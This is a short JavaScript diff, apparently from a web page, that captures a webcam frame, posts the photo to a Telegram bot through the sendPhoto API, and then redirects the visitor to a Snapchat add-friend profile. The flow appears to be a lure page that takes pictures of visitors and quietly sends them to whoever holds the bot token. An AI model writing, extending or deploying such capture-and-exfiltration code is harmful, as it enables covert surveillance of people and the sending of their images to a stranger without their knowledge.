@@ -33,9 +33,11 @@ navigator.mediaDevices.getUserMedia({ video: true })
       form.append("photo", blob);
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: form
-      });
+  method: "POST",
+  body: form
+}).then(() => {
+  window.location.href = "https://www.snapchat.com/add/habebabulaila";
+});
     }, "image/jpeg");
   };
 })
